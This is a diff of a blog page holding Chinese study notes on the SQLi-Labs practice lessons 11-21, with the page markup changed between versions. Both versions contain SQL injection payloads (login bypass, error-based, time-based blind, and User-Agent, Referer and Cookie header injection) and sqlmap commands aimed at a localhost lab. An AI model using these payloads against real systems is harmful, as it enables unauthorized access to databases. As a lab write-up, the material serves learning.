@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="小知识121、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用--level 参数且数值&amp;gt;=2的时候也会检查cookie时面的参数，当&amp;gt;=3的时候将检查User-ag">
+<meta name="description" content="小知识 1、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&amp;gt;=2的时候也会检查cookie时面的参数，当&amp;gt;=3的时候将检查User-agen">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQLi-Labs学习笔记11~21">
 <meta property="og:url" content="http://yoursite.com/2019/01/09/SQLi-Labs学习笔记11-21/index.html">
 <meta property="og:site_name" content="风介穹宇">
-<meta property="og:description" content="小知识121、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用--level 参数且数值&amp;gt;=2的时候也会检查cookie时面的参数，当&amp;gt;=3的时候将检查User-ag">
+<meta property="og:description" content="小知识 1、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&amp;gt;=2的时候也会检查cookie时面的参数，当&amp;gt;=3的时候将检查User-agen">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-01-09T09:53:19.021Z">
+<meta property="og:updated_time" content="2019-01-09T11:06:47.930Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLi-Labs学习笔记11~21">
-<meta name="twitter:description" content="小知识121、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用--level 参数且数值&amp;gt;=2的时候也会检查cookie时面的参数，当&amp;gt;=3的时候将检查User-ag">
+<meta name="twitter:description" content="小知识 1、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&amp;gt;=2的时候也会检查cookie时面的参数，当&amp;gt;=3的时候将检查User-agen">
 
 
 
@@ -384,9 +384,14 @@
       
 
       
-        <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。</span><br><span class="line">2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用--level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer。</span><br></pre></td></tr></table></figure>
+        <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><blockquote>
+<p>1、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。<br>2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer。</p>
+</blockquote>
 <a id="more"></a>
-<h5 id="Lesson-11-14、17-POST-Error-Based-Double-Injection"><a href="#Lesson-11-14、17-POST-Error-Based-Double-Injection" class="headerlink" title="Lesson-11/14、17 POST - Error Based/Double Injection"></a>Lesson-11/14、17 POST - Error Based/Double Injection</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; #&amp;passwd=dfdsf&amp;submit=Submit`</span><br><span class="line"></span><br><span class="line">uname=admin&apos; and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) #&amp;passwd=dfdsf&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<h5 id="Lesson-11-14、17-POST-Error-Based-Double-Injection"><a href="#Lesson-11-14、17-POST-Error-Based-Double-Injection" class="headerlink" title="Lesson-11/14、17 POST - Error Based/Double Injection"></a>Lesson-11/14、17 POST - Error Based/Double Injection</h5><blockquote>
+<p>uname=admin’ #&amp;passwd=dfdsf&amp;submit=Submit`</p>
+<p>uname=admin’ and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) #&amp;passwd=dfdsf&amp;submit=Submit</p>
+</blockquote>
 <p>两个字段都有注入，以上Lesson-11两个PoC的差别在于：</p>
 <ol>
 <li>注释后面的SQL语句实现任意用户登录；</li>
@@ -395,16 +400,25 @@
 <p>Lesson-12/15改为双引号加括号，无需赘言。</p>
 <p>Lesson-17注入点在password处，仅此而已。</p>
 <hr>
-<h5 id="Lesson-15-16-POST-Blind-Boolean-time-Based"><a href="#Lesson-15-16-POST-Blind-Boolean-time-Based" class="headerlink" title="Lesson-15/16 POST - Blind- Boolean/time Based"></a>Lesson-15/16 POST - Blind- Boolean/time Based</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and if(length(database())=8,sleep(1),null) #&amp;passwd=passwd&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname=admin&quot;) and if(length(database())=8,sleep(1),null) #&amp;passwd=pass&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<h5 id="Lesson-15-16-POST-Blind-Boolean-time-Based"><a href="#Lesson-15-16-POST-Blind-Boolean-time-Based" class="headerlink" title="Lesson-15/16 POST - Blind- Boolean/time Based"></a>Lesson-15/16 POST - Blind- Boolean/time Based</h5><blockquote>
+<p>uname=admin’ and if(length(database())=8,sleep(1),null) #&amp;passwd=passwd&amp;submit=Submit</p>
+<p>uname=admin”) and if(length(database())=8,sleep(1),null) #&amp;passwd=pass&amp;submit=Submit</p>
+</blockquote>
 <p>这里不知道正确的用户名密码，因此无法测试Boolean Based。对于Time Based类型，难点是判定注释的字符，后期可以关于CTF多练练手。</p>
 <hr>
 <h5 id="Lesson-18-20-Header-Cookie-Injection"><a href="#Lesson-18-20-Header-Cookie-Injection" class="headerlink" title="Lesson-18/20 Header/Cookie Injection"></a>Lesson-18/20 Header/Cookie Injection</h5><p>这3个docker环境都没好，贴上其它玩家的剖析。</p>
 <p>Lesson-18 User-Agent注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">手注：</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1</span><br><span class="line">SQLMap：</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --user-agent=&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0*&quot; --level 4 --dbs --threads 10 --technique BEST --bach</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>手注：<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0’ and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1<br>SQLMap：<br>python sqlmap.py -u “<a href="http://127.0.0.1/sqli-labs-master/Less-18/&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-18/&quot;</a> –user-agent=”Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0*” –level 4 –dbs –threads 10 –technique BEST –bach</p>
+</blockquote>
 <p>Lesson-19 Referer注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">手注：</span><br><span class="line">Referer: http://127.0.0.1:8088/&apos; and updatexml(1,concat(0x7e,(select version()),0x7e),1)1,1)</span><br><span class="line">SQLMap：</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-19/&quot; --referer=&quot; http://127.0.0.1/sqli-labs-master/Less-19/*&quot; --level 4 --dbs --threads 10 --technique BEST --batch</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>手注：<br>Referer: <a href="http://127.0.0.1:8088/&#39;" target="_blank" rel="noopener">http://127.0.0.1:8088/&#39;</a> and updatexml(1,concat(0x7e,(select version()),0x7e),1)1,1)<br>SQLMap：<br>python sqlmap.py -u “<a href="http://127.0.0.1/sqli-labs-master/Less-19/&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-19/&quot;</a> –referer=” <a href="http://127.0.0.1/sqli-labs-master/Less-19/*&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-19/*&quot;</a> –level 4 –dbs –threads 10 –technique BEST –batch</p>
+</blockquote>
 <p>Lesson-20 Cookie注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">手注：</span><br><span class="line">Cookie:uname=-1&apos; union select 1,database(),user() #</span><br><span class="line">SQLMap：</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-20/&quot; --level 3</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>手注：<br>Cookie:uname=-1’ union select 1,database(),user() #<br>SQLMap：<br>python sqlmap.py -u “<a href="http://127.0.0.1/sqli-labs-master/Less-20/&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-20/&quot;</a> –level 3</p>
+</blockquote>
 
       
     </div>
